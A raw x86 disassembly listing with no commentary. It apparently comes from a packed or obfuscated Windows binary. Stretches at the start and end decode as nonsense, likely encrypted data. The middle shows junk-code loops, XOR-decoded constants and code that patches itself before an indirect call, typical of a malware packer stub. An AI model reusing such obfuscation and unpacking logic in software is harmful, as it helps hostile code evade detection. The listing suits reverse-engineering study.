  40b09c:	scas   al,BYTE PTR es:[edi]
  40b09d:	sahf   
  40b09e:	and    cl,BYTE PTR [edx]
  40b0a0:	inc    edi
  40b0a1:	and    bh,BYTE PTR [ebp-0x256b04de]
  40b0a7:	sub    dh,BYTE PTR [ebp-0x185659]
  40b0ad:	stos   BYTE PTR es:[edi],al
  40b0ae:	dec    edi
  40b0af:	xchg   edx,eax
  40b0b0:	sar    ah,1
  40b0b2:	xchg   esi,eax
  40b0b3:	sbb    esi,DWORD PTR [edi-0x5e]
  40b0b6:	and    edx,ecx
  40b0b8:	call   0xb62ec5cc
  40b0bd:	adc    al,0xb
  40b0bf:	jl     0x40b119
  40b0c1:	or     al,0xc8
  40b0c3:	inc    ecx
  40b0c4:	push   esp
  40b0c5:	mov    ds:0x737a2171,eax
  40b0ca:	sub    eax,0x33af66cc
  40b0cf:	(bad)  
  40b0d0:	retf   
  40b0d1:	ffreep st(1)
  40b0d3:	in     al,dx
  40b0d4:	xchg   edi,eax
  40b0d5:	cmp    BYTE PTR [eax+0x6f],ch
  40b0d8:	dec    ecx
  40b0d9:	jnp    0x40b0ca
  40b0db:	enter  0xf9d2,0x28
  40b0df:	iret   
  40b0e0:	add    edx,DWORD PTR [ebx+0x5fec3d72]
  40b0e6:	loopne 0x40b123
  40b0e8:	loopne 0x40b0d2
  40b0ea:	imul   esp,DWORD PTR [eax+0x1ec1a04c],0x60c19f4c
  40b0f4:	xchg   esi,eax
  40b0f5:	(bad)  
  40b0f6:	jge    0x40b0c9
  40b0f8:	fucomi st,st(2)
  40b0fa:	add    cl,BYTE PTR [eax+0x246c2e05]
  40b100:	jg     0x40b144
  40b102:	or     ebx,edi
  40b104:	pop    es
  40b105:	stc    
  40b106:	mov    ah,0xd7
  40b108:	mov    edx,0x99294d69
  40b10d:	jle    0x40b0f8
  40b10f:	dec    edi
  40b110:	mov    DWORD PTR [ebx+0x6f],ebx
  40b113:	cwde   
  40b114:	pop    ecx
  40b115:	in     eax,dx
  40b116:	pop    ecx
  40b117:	(bad)  
  40b118:	and    al,0x8f
  40b11a:	arpl   WORD PTR [eax*4-0x489e5d74],dx
  40b121:	mov    eax,0xf810a4b5
  40b126:	fldenv [ecx+0x39]
  40b129:	sbb    eax,0x57700f9c
  40b12e:	out    dx,eax
  40b12f:	je     0x40b0d4
  40b131:	mov    al,ds:0x98054e6d
  40b136:	leave  
  40b137:	mov    BYTE PTR [ebp+ebp*8-0x5f],bh
  40b13b:	inc    edi
  40b13c:	lahf   
  40b13d:	sub    al,BYTE PTR [edi]
  40b13f:	call   ecx
  40b141:	add    dh,BYTE PTR [edx+0x63]
  40b144:	jno    0x40b11f
  40b146:	or     bl,BYTE PTR [ebp-0x511f583c]
  40b14c:	ret    0xf2c3
  40b14f:	dec    edx
  40b150:	add    eax,0x27ef493a
  40b155:	in     al,0x7e
  40b157:	fs mov DWORD PTR gs:[edx+0x41],ebx
  40b15c:	and    BYTE PTR [edx],al
  40b15e:	cdq    
  40b15f:	aas    
  40b160:	dec    esp
  40b161:	xor    BYTE PTR [edx-0x6d],0x3c
  40b165:	pusha  
  40b166:	mov    dl,0xf1
  40b168:	cli    
  40b169:	push   ebp
  40b16a:	call   0x27e1:0x8a98c613
  40b171:	icebp  
  40b172:	loop   0x40b12a
  40b174:	or     DWORD PTR [eax+0xc6e3469],ebp
  40b17a:	cmp    DWORD PTR [edi],edi
  40b17c:	and    BYTE PTR [eax+0x70714e86],bl
  40b182:	and    DWORD PTR [eax+0x33],ebp
  40b185:	inc    edi
  40b186:	repz jne 0x40b1dd
  40b189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b18a:	add    DWORD PTR [ebx],ebx
  40b18c:	mov    ah,0xb7
  40b18e:	xor    edi,DWORD PTR [ecx+0x4e]
  40b191:	pop    esp
  40b192:	aam    0x9e
  40b194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b195:	push   eax
  40b196:	fisttp WORD PTR [ebx+0x758b1845]
  40b19c:	adc    BYTE PTR [ecx+0x458b0c46],cl
  40b1a2:	sbb    al,0x8b
  40b1a4:	jne    0x40b1b6
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d3dc
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff5e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d3dc
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d460
  40b34b:	mov    esi,DWORD PTR ds:0x41d458
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d458,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d458
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d458
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d458
  40b3aa:	mov    ds:0x41d460,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ffb1
  40b3fa:	push   0x41ff9b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d3dc
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d4e8
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d1fc
  40b4c0:	mov    esi,DWORD PTR ds:0x41d218
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x42003f
  40b51b:	mov    esi,DWORD PTR ds:0x41d214
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x420027
  40b559:	mov    ecx,DWORD PTR ds:0x41d1e0
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d258
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d4b4
  40b774:	push   DWORD PTR ds:0x41d260
  40b77a:	push   DWORD PTR ds:0x41d494
  40b780:	push   DWORD PTR ds:0x41d508
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d458
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d254
  40b812:	mov    edx,DWORD PTR ds:0x41d1e0
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d3dc
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d22c
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0x2030b34c
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx-0x38]
  40bac3:	inc    esp
  40bac4:	inc    edi
  40bac5:	data16 jp 0x40ba51
  40bac8:	scas   al,BYTE PTR es:[edi]
  40bac9:	retf   0x6731
  40bacc:	enter  0x73bd,0x74
  40bad0:	jecxz  0x40bab4
  40bad2:	ds ins BYTE PTR es:[edi],dx
  40bad4:	iret   
  40bad5:	sub    BYTE PTR [ecx],bh
  40bad7:	enter  0x70d6,0x80
  40badb:	or     DWORD PTR [edi+0x18],esp
  40bade:	shl    DWORD PTR [edx],0x5a
  40bae1:	dec    ecx
  40bae2:	jb     0x40bae8
  40bae4:	inc    ebp
  40bae5:	sbb    eax,0x27cdc388
  40baea:	and    edx,DWORD PTR [esi+0x58]
  40baed:	ss gs inc esi
  40baf0:	stc    
  40baf1:	sub    al,0xde
  40baf3:	mov    ecx,0xd4d4b765
  40baf8:	sub    al,0x21
  40bafa:	ret    0x78bf
  40bafd:	in     al,dx
  40bafe:	enter  0x51d,0x81
  40bb02:	ss ja  0x40bb6b
  40bb05:	jo     0x40bb4f
  40bb07:	out    0x53,al
  40bb09:	push   eax
  40bb0a:	mov    al,0x89
  40bb0c:	pusha  
  40bb0d:	push   edi
  40bb0e:	sbb    DWORD PTR [esi],eax
  40bb10:	inc    ebp
  40bb11:	je     0x40bb90
  40bb13:	push   eax
  40bb14:	sub    al,al
